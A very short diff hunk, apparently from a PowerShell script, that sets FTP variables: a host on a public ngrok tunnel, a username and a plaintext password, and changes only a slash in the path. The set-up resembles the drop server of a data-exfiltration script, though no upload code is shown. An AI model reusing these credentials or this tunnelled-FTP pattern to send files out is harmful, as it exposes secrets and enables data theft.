@@ -1,5 +1,5 @@
 # FTP Server Variables
-$FTPHost = 'ftp://0.tcp.ngrok.io:18939/home/dumdumftp/'
+$FTPHost = 'ftp://0.tcp.ngrok.io:18939//home/dumdumftp/'
 $FTPUser = 'dumdumftp' #username
 $FTPPass = 'p#}Vck,fayt?ipNqYhy9uzcG' #pwd
 
